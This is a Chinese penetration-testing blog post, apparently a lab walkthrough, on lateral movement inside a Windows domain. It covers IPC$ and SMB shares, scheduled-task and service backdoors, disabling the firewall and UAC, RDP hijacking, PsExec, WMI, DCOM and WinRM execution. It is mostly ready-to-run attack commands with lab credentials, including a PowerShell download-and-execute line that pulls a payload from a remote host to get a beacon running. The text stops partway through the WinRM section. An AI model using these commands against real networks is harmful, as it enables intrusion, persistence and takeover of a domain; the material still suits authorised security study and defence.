---
title: 内网横向移动
date: 2023-09-03T15:29:52+08:00
updated: 2023-09-13T18:06:41+08:00
categories: 
- 渗透测试
- 内网体系建设
---

# 内网横向

## 环境搭建

攻击机kali:192.168.14.131

域内机器PC方便测试我添加了两张网卡，一张同通向kali，一张通向域内机器DC，用蚁剑管理，方便横向测试

```
IP1 :192.168.14.110
IP2 :192.168.30.20
```

域控主机DC:192.168.30.10

```
域管:
Administrator:uu2fu3o@admin
域用户:
uu2fu3o:!qaz@WSX
域:
hack.com
```

## 横向移动中的文件传输

### 利用IPC$进行网络共享

https://xz.aliyun.com/t/11783

`IPC$(Internet Process Connection)`是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，也就是两个进程之间可以利用它产生数据交互，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。

执行net share获取到windows默认开启的网络共享，通过已控主机搭建IPC$服务链接内网主机，能够直接访问内网资源等

**利用条件**

远程主机开启了IPC服务

远程主机的135和445端口开放

```shell
net use  \\<IP/Hostname>\IPC$ <password> /user:<Username>  #建立连接
dir \\IP\C$  #列出目标的C盘
copy .\reverse_tcp.exe \\IP\C$  #将脚本复制到目标机器的C盘下
```

建立其他共享的命令与ipc相似，可使用账户密码以及ip地址进行连接

```
net use \\IP\C$ "password" /user:"username"
```

==注意==

IPC$默认大概率会禁用空密码的用户进行连接，并且目前的windows系统在安装的时候都会默认禁用`Administrator`用户，*而是创建一个普通用户并把它加到管理组内*

### 搭建SMB服务器

SMB（Server Message Block）是一种网络协议，用于在计算机之间共享文件、打印机和其他资源。SMB服务器是运行SMB协议的服务器，它提供文件共享和资源访问的功能，使客户端能够通过网络连接到服务器并访问共享的文件和目录。

攻击者可以通过在自己的服务器上或已控服务器上搭建SMB服务器，并将需要横向的文件添加到指定的UND路径当中(需使用SMB匿名共享)

 **linux**

在linux上搭建smb服务器可通过impacket项目提供的smbserver.py来进行

![linux-smbserver](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGolinux-smbserver.png)

该项目搭建了一个名为testsmb的服务器，并且共享目录设置为/root/share

**windows**

使用命令行开启共享

1.启用Guest用户

```
net user guest /active:yes
```

2.将Everyone权限应用于匿名用户

```
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
```

3.指定匿名共享文件的位置

```
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d smb /f
```

4.将Guest用户从策略“拒绝从网络访问这台计算机”中移除

导出组策略：

```
secedit /export /cfg gp.inf /quiet
```

修改文件gp.inf，将`SeDenyNetworkLogonRight = Guest`修改为`SeDenyNetworkLogonRight =`，保存

重新导入组策略：

```
secedit /configure /db gp.sdb /cfg gp.inf /quiet
```

强制刷新组策略，立即生效(否则，重启后生效)：

```
gpupdate/force
```

5.设置文件共享

```
icacls C:\share\ /T /grant Everyone:r
net share share=c:\share /grant:everyone,full
```

至此，可匿名访问的文件共享服务器开启成功，访问的地址为`//<ip>/smb`

也可以通过脚本一键开启

https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer

```powershell
Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Enable  #开启
Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Disable  #关闭
```

问题请参考：

https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BC%80%E5%90%AFWindows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E5%85%B1%E4%BA%AB

![windows-smbserver](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/windows-smbserver.png)

![windows-dc-tp-pc-smbserver](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/windows-dc-tp-pc-smbserver.png)

### 利用windows自带的工具

#### certutil

windows自带的命令行工具，用于管理证书和部分证书服务的安装，提供了从网络中下载文件的功能

```
certutil -urlcache -split -f http://uu2fu3o.com/test.dtd c:\test.dtd
```

![certutil-pc](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/certutil-pc.png)

如图，文件成功被下载到指定位置

#### BITSAdmin

winodows自带的命令行工具(win7及以后的版本)，可完成上传文件，下载等任务

```
bitsadmin /transfer test http://uu2fu3o.com/test.dtd C:\bitsadmin.txt
```

![bitsadmin-pc](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/bitsadmin-pc.png)

#### Powershell

```
(New-Object Net.WebClient).DownloadFile('http://uu2fu3o.com/test.dtd','C:\powershell-download.txt')
```

![powershell-download-pc](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/powershell-download-pc.png)

如图从对应url下载文件

## 计划任务横向

### 常规流程

虽说是计划任务，但还是不免需要用到IPC共享的技术，通过已经建立的IPC连接上传reverse_shell.exe程序，并创建计划任务使其执行

1.利用已建立的共享上传文件到目标机器

2.利用IPC连接或使用凭据的方法在远程主机上创建计划任务

直接演示没有建立IPC连接的方法，利用用户凭据创建计划任务（需要是管理员凭据）

```
schtasks /Create /S 192.168.30.10 /TN Backdoor /SC minute /MO 1 /TR C:\beacon2.exe /RU System /F /U Administrator /P uu2fu3o@admin
```

![plan-mission](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/plan-mission.png)

这里为了实验更加直观，方便，给DC添加了第二张网卡(记得把文件传过去，执行的是本地文件)，执行后即可上线

![dc-plan-mission](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dc-plan-mission.png)

执行以下命令，将创建的计划任务删除

```
schtasks /Delete /S 192.168.30.10 /TN Backdoor /F
```

![plan-missions-delete](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/plan-missions-delete.png)

### UNC路径加载执行

Windows系统中使用UNC路径来访问网络共享资源,大致格式如下

```
\\servername\sharename\directory\filename
```

servername:服务器主机名

sharename:共享服务名

directory和:filename:  目录和文件名

#### What is UNC

UNC（Universal Naming Convention）共享路径是一种用于标识和访问网络上共享资源的命名约定。它通常用于在本地计算机或网络上访问共享文件夹、打印机或其他网络资源。

#### How to use

+ 在域内一台服务器上搭建SMB匿名服务

已经在第一节中介绍了如何搭建SMBSERVER，跳过

+ 使用UNC路径加载目标

```
schtasks /Create /S 192.168.30.10 /TN Backdoor /SC minute /MO 1 /TR \\192.168.30.20\smb\smb-plan-test.exe /RU System  /F /U Administrator /P uu2fu3o@admin
```

![smb-test-pan](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/smb-test-pan.png)

注意你的smb服务是否已经设定了文件目录，如果有则不需要再设置一次

![smb-test-plan-2-shell](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/smb-test-plan-2-shell.png)

一会就能拿到很多会话(实验完记得关闭计划任务或者删除)

## 利用系统服务

### 创建远程服务，利用SC进行横向

```
net use \\192.168.30.10\IPC$ uu2fu3o@admin /user:Administrator
```

![ipc-built-pc_to_dc](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/ipc-built-pc_to_dc.png)

+ 利用已经建立的共享服务将恶意文件上传到服务器

![system-server-build](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/system-server-build.png)

+ 利用已建立的IPC共享在远程服务器创建系统服务，执行以下命令

```shell
sc \\192.168.30.10 create Backdoor binpath= "cmd.exe /k C:\system-server-build.exe"
#创建一个名为Backdoor的系统服务，为手动执行，binpath后需要有空格
```

+ 执行以下命令启动服务

```
sc \\192.168.30.10 start Backdoor
```

![system-server-build-paild-menu](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/system-server-build-paild-menu.png)

虽然看到这里失败了，但其实我们已经拿到shell了

![system-server-build-cs-shell](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/system-server-build-cs-shell.png)

通常在渗透流程中，我们运用该项技巧来关闭远程机器的防火墙，如下示例

```
sc \\192.168.30.10 create unablefirewall binpath= "netsh advfirewall set allprofiles state off"   
sc \\192.168.30.10 start unablefirewall   
```

### 无文件横向移动SCshell

SCShell是无文件横向移动工具，它依赖ChangeServiceConfigA来运行命令。该工具的优点在于它不会针对SMB执行身份验证。一切都通过DCERPC执行。无需创建服务，而只需通过ChangeServiceConfigAAPI 远程打开服务并修改二进制路径名即可（所以要事先知道目标上的服务名称）。支持py和exe两种文件类型。

+ 上传Scshell到已控服务器

+ 利用Scshell执行命令横向

大致语法规则如下

```
SCShell.exe target service payload domain username password
```

1.利用Scshell写入文件

```
SCshell.exe 192.168.30.10 Backdoor "C:\Windows\System32\cmd.exe /c systeminfo > \\192.168.30.20\smb\systeminfo.txt" . Administrator uu2fu3o@admin
```

![SCshell-smb-share](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/SCshell-smb-share.png)

执行systeminfo命令，并将执行内容写入smb共享中 ，但是写入的内容为0kb(很怪)，正常写入的文件大小应该为3kb，经过抓取的流量分析，发现通过SCshell调用的命令仅执行了创建文件的功能，正常写入文件的程序是执行了写入功能的

![systeminfo-faild](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/systeminfo-faild.png)

失败案例在创建文件之后就down掉了，服务器再次播报。似乎是网络问题导致的tcp再次重新发送失败

2.利用SCshell上线cs

```
SCshell.exe 192.168.30.10 Backdoor "C:\Windows\System32\cmd.exe /c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClinet).DownloadString('http://uu2fu3o.com/payload.ps1')" hack.com Administrator uu2fu3o@admin
```

![scshell-powershell-cs](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/scshell-powershell-cs.png)

### UAC Remote Restrictions

UAC远程限制，当用户以本地用户远程运行需要管理员用户的程序，都只能使用本地用户中RID为500(Adminitrator)的管理员用户来运行

需要注意的是该限制对域管用户无效，执行以下命令查看本机上用户的SID和RID

```
wmic useraccount where name='username' get sid
```

![SID-RID-PC](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/SID-RID-PC.png)

执行以下命令关闭UAC Remote Restrictions

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

该命令与SC创建系统服务结合能进行远程UAC关闭(或许能成，但是写入的服务没有双引号指定路径)

##  远程桌面利用

远程桌面协议(RDP)，默认监听端口为3389，通过已获得的凭据进行代理登录远程主机并进行实时操控

缺点：可能导致对方用户强行下线，易被发现

### 远程桌面的确定和开启

执行以下命令来确定本机的远程桌面功能是否开启

```
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections 
```

![pc-rdp-close](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/pc-rdp-close.png)

如图为0x1说明已禁用，0x0为开启，执行以下命令开启本地RDP服务

```
#开启服务
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
#关闭“仅允许运行使用网络级别身份验证的远程桌面计算机连接”(鉴权)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 
#设置防火墙策略放行3389端口
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```

![pc-rdp-open](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/pc-rdp-open.png)

对远程主机，可使用WMI来开启远程桌面服务

```
wmic /Node:192.168.30.10 /User:Administrator /Password:uu2fu3o@admin RDTOGGLE WHERE ServerName="DC" call SetAllowTSConnections 1
```

![pc-wmi-dc-rdp-open](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/pc-wmi-dc-rdp-open.png)

需要指定远程主机的IP，主机名，用户凭据(这里用的域管用户)

### RDP Hijacking

需要SYSTEM权限，并执行tscon命令

通过query user命令可以查看当前主机上存在哪些会话

![pc-query-user](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-query-user.png)

通过msf提权到SYSTEM权限，使用以下命令

```
tscon id
```

即可切换到目标用户的远程会话，这是由于SYSTEM能够完全绕过用户权限的验证，不用输入密码即可切换到其他用户

### SharpRDP

需要目标放行3389端口，以及用户凭据

需要注意的是，使用该方法进行连接之后，目标机器会进入锁屏状态

![pc-sharprdp-cacl](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-sharprdp-cacl.png)

![pc-cacl-sharprdp](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-cacl-sharprdp.png)

## PsExec远控

 根据官方对PsExec的介绍，该工具让你在其他系统上执行进程，并为控制台应用程序提供完整交互性，而无需手动安装客户端软件。 PsExec 最强大的用途包括在远程系统上启动交互式命令提示符，以及 IpConfig 等远程启用工具，否则无法显示有关远程系统的信息。

#### 工具原理

通过SMB连接到目标服务器的Admin$共享(该共享默认开启)，并释放名为psexecsvc.exe的二进制文件，注册名为PSEXECSVC的服务，

当客户端执行命令时，会启动PSEXECSVC服务执行相应的命令并返回数据。运行结束后，该服务会被删除

![psexec-smb-target](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/psexec-smb-target.png)

整个过程的SMB对象如上图

![psexec-pcapng](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/psexec-pcapng.png)

上图为创建二进制文件的流量，关键部分进行了标记，该流量包可直接从http://uu2fu3o.com/PsExec-systeminfo.pcapng下载(在vps没到期之前)

#### 利用条件

+ 远程主机开启ADMIN$共享
+ 远程主机关闭防火墙或放行445端口

该工具的命令参数

![how_to_use_psexec](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/how_to_use_psexec.png)

执行以下命令，利用域管用户的凭据在目标机器上执行systeminfo命令，并回显到本地机器

``` 
PsExec.exe -accepteula \\192.168.30.10 -u hack\Administrator -p uu2fu3o@admin -s sysetminfo
```

![pc-to-dc-psexec-systeminfo](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-to-dc-psexec-systeminfo.png)

该方法会产生大量的日志文件

![dc-log-psexec](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/dc-log-psexec.png)

能够看到来源于PC的登录验证，可自行搜索event id 为4648和4624的日志查看进程

## 利用WMI进行横向移动

### What is WMI

根据官方的介绍

Windows Management Instrumentation (WMI) 是 Microsoft 对基于 Web 的企业管理 (WBEM) 的实现，WBEM 是一项业界倡议，用于为访问企业环境中的管理信息开发一项标准技术。 WMI 使用通用信息模型 (CIM) 行业标准来表示系统、应用程序、网络、设备和其他托管组件。 CIM 由分布式管理任务组 ([DMTF](https://www.dmtf.org/standards/wsman)) 开发和维护。

从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统。

#### 什么情况会用到WMI

由于PsExec被大量的软件监测，且会产生大量的日志文件，越来越多的工具开始使用WMI进行横向移动

常规的利用方法分为两种

+ 利用WMI的类方法进行远程执行，例如：Win32_Process类中的Create方法能够在远程服务器创建进程，Win32_Product类中的Install方法可以在远程主机上安装恶意MSI文件
+ 远程部署WMI时间订阅，在特定时间触发攻击

#### 利用条件

远程放行135端口(WMI的默认端口)

远程主机的WMI服务为开启状态(默认开启)

### 常规利用方法

在windows上通过wmic.exe和powershell cmdlet来使用WMI数据和执行WMI方法

+ 执行远程查询

  ```shell
  wmic /node:192.168.30.10 /user:Administrator /password:uu2fu3o@admin process list brief
  #/node:指定远程主机 /user:指定用户名 /password：指定用户密码
  ```

  ![pc-wmic-dc](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-wmic-dc.png)

+ 创建远程服务

  ```
  wmic /node:192.168.30.10 /user:Administrator /password:uu2fu3o@admin process call create "cmd.exe /c systeminfo > \\192.168.30.20\smb\systeminfo.txt"
  ```

  ![pc-wmic-to-dc-systeminfo](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-wmic-to-dc-systeminfo.png)

​	由于wmic执行系统命令并没有回显，所以可以通过写入共享文件夹的形式来读取

​	该方法似乎并不能直接创建位于SMB共享文件夹中的shell进程(好像成功了一次，但后面并没有再成功接收到shell了)

+ 远程安装MSI文件

  1.利用msf或其他工具生成恶意msi文件，并开启监听

  ![msf-wmic-listening](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/msf-wmic-listening.png)

​		2.将恶意文件上传至跳板机已经搭建好的共享服务文件夹，通过调用Win32_Product.Install方法使远程主机安装恶意msi文件来获取		权限![	](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/c-share.png)

​		执行以下命令

```
wmic /node:192.168.30.10 /user:Administrator /password:uu2fu3o@admin product call install PackageLocation="\\192.168.30.20\smb\msf.msi"
```

![msi-pc-dc-wmic](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/msi-pc-dc-wmic.png)

msf未能成功上线，原因为win server2012环境问题，不允许安装msi文件

### 常见利用工具

#### wmiexec

该工具位于impacket项目中，本身是一个py项目，可通过pyinstaller编译为exe文件，上传至windows使用，该工具可以通过提供的用户凭据开启一个半开式或全开的交互式shell，使用该工具需要同时开启135和445端口，其中445端口用于传输执行命令的回显

执行以下命令，使用wmiexec获取一个交互式shell

```python
python wmiexec.py hack/Administrator:uu2fu3o@admin@192.168.14.110
#python wmiexec.py <domain>/<username>:<password>@<IP>
```

![wmiexec-pc](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/wmiexec-pc.png)

执行以下命令将该py项目编译为二进制程序在windows上进行运行

```
pyinstaller -F wmiexec.py
```

或者直接下载现成的exe文件进行使用

https://github.com/maaaaz/impacket-examples-windows

使用效果与使用python进行连接效果相同

#### Invoke-WmiCommand

该项目源于powerspolit，可以通过powershell远程调用wmi来执行命令

将Invoke-WmiCommand.ps1上传至web站点(需要目标机器能够访问下载，最好是已控主机开启的http服务)

在已控主机上执行以下命令

```shell
#远程加载ps脚本
IEX(New-Object Net.Webclient).DownloadString('http://192.168.14.110/Invoke-WmiCommand.ps1')
#指定远程系统用户名
$User = "hack\Administrator"
#指定远程系统用户密码
$Password = ConvertTo-SecureString -String "uu2fu3o@admin" -AsPlainText -Force
#将用户名和密码整合，以便导入Credential
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password
#指定远程主机的IP和要执行的命令
$Remote = Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName "192.168.30.10"
#输出命令执行回显
$Remote.PayloadOutput
```

![powerspolit-dc-to-ps](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/powerspolit-dc-to-ps.png)

注意起始位置为PS

以及：

https://github.com/rootclay/WMIHACKER

### WMI订阅事件的利用

远程部署WMI事件订阅需要在远程系统上具有管理员权限，WMI事件订阅用到的两个组件event,consumer

+ Event Filter:

  WQL事件查询，用于将事件筛选为特定条件集，例如刚刚在终端上派生的Outlook.exe。WQL查询可能类似于

  ```
  Select * From __InstanceCreationEvent Within 5 
  Where TargetInstance Isa “Win32_Process” AND TargetInstance.Name = "Outlook.exe"
  ```

  类似于查询某个进程的创建或某个命令的执行，当查询到对应进程创建时，就会调用consumer

+ 事件消费者（Event Consumer）：这是事件触发时我们想要进行的特定操作，从红队交付来看，我们感兴趣的两个类是`ActiveScriptEventConsumer`和`CommandLineEventConsumer`。其中，`ActiveScriptEventConsumer`允许执行脚本代码（来自JScript或VBScript引擎），而`CommandLineEventConsumer`类则允许运行任意命令。我个人比较倾向于`ActiveScriptEventConsumer`类，这样就可以避免触及LOLBin的雷区。

  https://www.anquanke.com/post/id/223232

筛选器与消费者总是绑定在一起的，当筛选器轮询到对应进程启动时，将会调用消费者执行任意命令，或是执行脚本文件等

不难看出该方法更适用于权限持久化，但是，我们同样可以进行无文件的横向移动

#### Sharp_WMIEvent

项目地址：https://github.com/wh0amitz/Sharp-WMIEvent

```shell
Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -Computername 192.168.30.10 -Domain hack.com -Username Administrator -Password uu2fu3o@admin -Command "cmd.exe /c \\192.168.30.20\smb\Sharp-WMIEvent.exe" 
#Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -Command "cmd.exe /c \\IP\evilsmb\reverse_tcp.exe" -FilterName <Filter Name> -ConsumerName <Consumer Name>
```

在目标服务器上创建一个永久性的WMI订阅事件，每60秒执行一次

## 利用DCOM

DCOM（分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。

DCOM 使用远程过程调用（RPC）技术将组件对象模型（COM）的功能扩展到本地计算机之外，因此，在远程系统上托管COM服务器端的软件（通常在DLL或exe中）可以通过RPC向客户端公开其方法

优点：在远程主机上执行的进程会是托管COM服务端的软件，增加了隐蔽性

### 本地DCOM测试

执行以下命令，查看本地DCOM程序列表

```
Get-CimInstance Win32_DCOMApplication
```

![dcom-dc-local](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dcom-dc-local.png)

+ Get-CimInstance这个命令只有在Powershell3.0以上的版本中才能使用(Winserver 2012往上的版本)

在win7或winerver2008等较低版本中默认安装powershell2.0,可替换为以下命令

```
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
```

![pc-local-dcom-find](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/pc-local-dcom-find.png)

#### 利用DCOM在本地执行命令

+ 利用MMC Application Class（MMC20.Application）

  执行以下命令查找本地的MMC

  ```
  shell powershell Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication | findstr "MMC"
  ```

  MMC Application Class（MMC20.Application）是一种编程接口，用于创建、管理和定制Microsoft Management Console（MMC）控制台。它提供了对MMC功能的编程访问，允许开发人员创建自定义的Snap-In、扩展控制台功能，并实现对控制台的编程操作和交互

  执行以下命令来加载一个MMC对象的COM实例（我们只需要提供一个DCOM ProgID和一个IP地址，就返回一个COM对象的实例）

  ```shell
  $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1"))
  ```

​	   获取该对象后，我们可以调用该实例查看能够执行的方法和属性

```
# 此时可执行如下命令获得"MMC20.Application"支持的操作
$com.Document.ActiveView | Get-Member
```

![dc-dcom-mmc-local](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dc-dcom-mmc-local.png)

能够看到该实例具有执行任意命令的方法，通过调用该方法在本地执行命令

```shell
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimized") #启动一个计算器，Minimized用于指定窗口的大小参数
```

![dcom-local-test-dc-calc](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dcom-local-test-dc-calc.png)

如上图本地调用执行程序成功

+ 其他可以利用的程序

​		ShellWindows、ShellBrowserWindow、Excel.Application以及Outlook.Application等

### 远程DCOM执行命令

在实例化一个对象时，我们提供了程序的ID一个实例化的IP，我们可以修改选项为远程主机来达到在远程主机上实例化对象的目的，并调用该实例化的对象执行命令

利用条件

+ 具有管理员权限的Powershell
+ 目标系统的防火墙对我方放行，或直接利用系统服务关闭对方的防火墙
+ 在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户

利用步骤

+ 通过IPC连接目标主机或是在可控主机上搭建SMB服务器的方式上传恶意木马文件(木马文件要在目标主机的可执行目录下)![Dcom-upload](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/Dcom-upload.png)

在共享文件夹中上传了名为Dcom.exe的后门程序

+ 通过powershell实现与远程主机Dcom的交互，并创建MMC20.Application的实例

```shell
#实例化对象，目标为远程主机
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.30.10"))
#在远程主机上执行exe程序
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c c:Dcom.exe","Minimized")
#完整命令
powershell $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.30.10")).Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c C:\Dcom.exe","Minimized")
```

![remote-dc-dcom](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/remote-dc-dcom.png)

成功返回shell

#### 调用ShellWindows远程执行命令

![shellwindows-id](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/shellwindows-id.png)

```shell
[Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.30.10")).item().Document.Application.ShellExecute("cmd.exe","/c C:\shell.exe","c:\windows\system32",$null,0)
```

![dcom-shellwindows](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dcom-shellwindows.png)

#### 调用Excel.Application远程执行命令

```shell
# 通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例:
$com = [activator]::CreateInstance([type]::GetTypeFromprogID("Excel.Application","192.168.30.10"))
#禁用警告和提示信息
$com.DisplayAlerts = $false
# 然后执行如下命令，我们就可以调用该对象的"DDEInitiate"方法在远程主机上启动进程:
$com.DDEInitiate("cmd.exe","/c C:\excel.exe")
```

#### ShellBrowserWindow

![shellbrowserwindow](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/shellbrowserwindow.png)

```shell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","127.0.0.1"))
$com.Documen.Application | Get-Member
```

![shellbrowsewindow-method](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/shellbrowsewindow-method.png)

调用方法为ShellExecute

```shell
#完整命令
[activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","192.168.30.10")).Document.Application.shellExecute("C:\shell.exe")
```

![shellbrowerwindows-exe](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/shellbrowerwindows-exe.png)

#### Visio.Application

使用条件：目标主机安装了Visio

```shell
[activator]::CreateInstance([type]::GetTypeFromProgID("Visio.Application","192.168.30.10")).[0].Document.Application.shellExecute("C:\shell.exe")
```

#### Outlook.Application

使用条件：目标主机安装了Outlook

通过Outlook创建Shell.Application对象来实现命令行执行：

```shell
[activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application","192.168.52.138")).createObject("Shell.Application").shellExecute("C:\shell.exe")
```

#### Impacket中的dcomexec.py脚本

```
python dcomexec.py domain/username:password@ip <command>
```

用于获取一个半交互式的shell

![dcomexec-py](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dcomexec-py.png)

需要提供目标机器上为管理员用户的账号密码

支持使用hash来代替明文密码

```
python dcomexec.py domain/username:@ip -hashes 
```

## WinRM

WinRM(Windows Remote Management)是 Microsoft 对 WS-Management 协议的实现，WS-Management 协议即一种基于标准简单对象访问协议（soap）的防火墙友好协议，它让来自不同供应商的硬件和操作系统能够相互操作。windows 众多可以远程执行命令方式中的一种。

作为DCOM和WMI远程管理的替代方法，WinRM用于通过WSMan与远程计算机建立会话，WSMan利用HTTP/S作为传输机制来传递XML格式的消息。在现代Windows系统中，WinRM HTTP通过TCP端口5985进行通信，而HTTPS（TLS）通过TCP端口5986进行通信。

### 利用条件

WinRS 适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC 全版本系统默认关闭。

只有在Win server 2012 之后的版本的WinRM服务才默认启动并监听了5985端口，允许远程任意主机来管理。

执行以下命令，查询本机的WinRM状态

```shell
powershell Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
```

![win2012-running](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/win2012-running.png)

执行以下命令，开启WinRM服务

```shell
winrm quickconfig -q #这条命令运行后会自动添加防火墙例外规则，放行5985端口。
#Enable-PSRemoting -Force
```

查看winrm具体配置

```
winrm get winrm/config
```

![pc-winrm-config](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/pc-winrm-config.png)

允许所有客户端连接IP

```shell
#cmd
winrm set winrm/config/Client @{TrustedHosts="*"}#添加信任列表操作
winrm e winrm/config/listener #查看监听地址和端口
#powershell
Set-Item WSMan:localhsot\client\trustedhosts -value *
```

### 通过WinRM执行远程命令

Windows远程管理工具提供了两个命令行工具用于远程管理

+ Winrs，允许远程执行命令的命令行工具，利用WS-Management协议
+ Winrm(Winrm.cmd),内置系统管理命令行工具，允许管理员配置本机的WinRM服务

1.winrs

执行以下命令，在远程主机上执行命令( 需要提供可用的用户凭据),并且双方都开启Winrm通信(需要位于信任列表中)

```
winrs -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin "whoami"
```

![winrs-pc-whoami](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/another_Intranet_horizontal/winrs-pc-whoami.png)

执行以下命令，利用winrs获取一个交互式shell

```
